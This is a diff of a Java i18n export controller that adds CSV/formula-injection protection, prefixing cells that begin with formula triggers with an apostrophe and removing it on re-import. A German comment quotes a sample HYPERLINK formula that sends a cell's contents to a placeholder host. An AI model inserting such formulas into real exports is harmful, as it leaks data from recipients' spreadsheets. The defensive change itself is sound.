@@ -231,29 +231,56 @@ public class I18nExportController {
     }
 
     /**
+     * SECURITY (Karte 314, Punkt 15): Zeichen, mit denen Excel/LibreOffice/Google Sheets eine
+     * Zelle als FORMEL interpretieren. Ein Uebersetzungstext wie
+     * {@code =HYPERLINK("https://example.invalid/?"&A1,"Klick")} landet ueber den Export in der
+     * Tabelle des Empfaengers und wird dort beim Oeffnen ausgefuehrt (CSV-/Formula-Injection).
+     */
+    private static final String CSV_FORMULA_TRIGGERS = "=+-@\t\r";
+
+    /**
      * Escape a value for CSV output. Wraps in quotes if it contains the separator, quotes, or newlines.
+     *
+     * <p>SECURITY (Karte 314, Punkt 15): fuehrende Formel-Trigger werden zusaetzlich mit einem
+     * einfachen Anfuehrungszeichen neutralisiert. Das ist die von OWASP empfohlene Variante: der
+     * Wert bleibt in der Tabelle lesbar, wird aber garantiert als Text behandelt. Der Re-Import
+     * ueber {@link #unescapeCsv(String)} entfernt das Zeichen wieder, damit Export -> Import
+     * verlustfrei bleibt.
      */
     private String escapeCsv(String value) {
         if (value == null) {
             return "";
         }
-        if (value.contains(CSV_SEPARATOR) || value.contains("\"") || value.contains("\n")) {
-            return "\"" + value.replace("\"", "\"\"") + "\"";
+        String safe = value;
+        if (!safe.isEmpty() && CSV_FORMULA_TRIGGERS.indexOf(safe.charAt(0)) >= 0) {
+            safe = "'" + safe;
         }
-        return value;
+        if (safe.contains(CSV_SEPARATOR) || safe.contains("\"") || safe.contains("\n")) {
+            return "\"" + safe.replace("\"", "\"\"") + "\"";
+        }
+        return safe;
     }
 
     /**
      * Unescape a CSV value (remove surrounding quotes, unescape doubled quotes).
+     *
+     * <p>SECURITY (Karte 314, Punkt 15): entfernt zusaetzlich das beim Export vorangestellte
+     * Schutz-Apostroph wieder, damit ein Export -> Import-Zyklus den Originaltext
+     * wiederherstellt und nicht bei jedem Durchlauf ein weiteres Apostroph anwaechst.
      */
     private String unescapeCsv(String value) {
         if (value == null) {
             return "";
         }
-        if (value.startsWith("\"") && value.endsWith("\"") && value.length() >= 2) {
-            return value.substring(1, value.length() - 1).replace("\"\"", "\"");
+        String result = value;
+        if (result.startsWith("\"") && result.endsWith("\"") && result.length() >= 2) {
+            result = result.substring(1, result.length() - 1).replace("\"\"", "\"");
         }
-        return value;
+        if (result.length() >= 2 && result.charAt(0) == '\''
+                && CSV_FORMULA_TRIGGERS.indexOf(result.charAt(1)) >= 0) {
+            result = result.substring(1);
+        }
+        return result;
     }
 
     /**
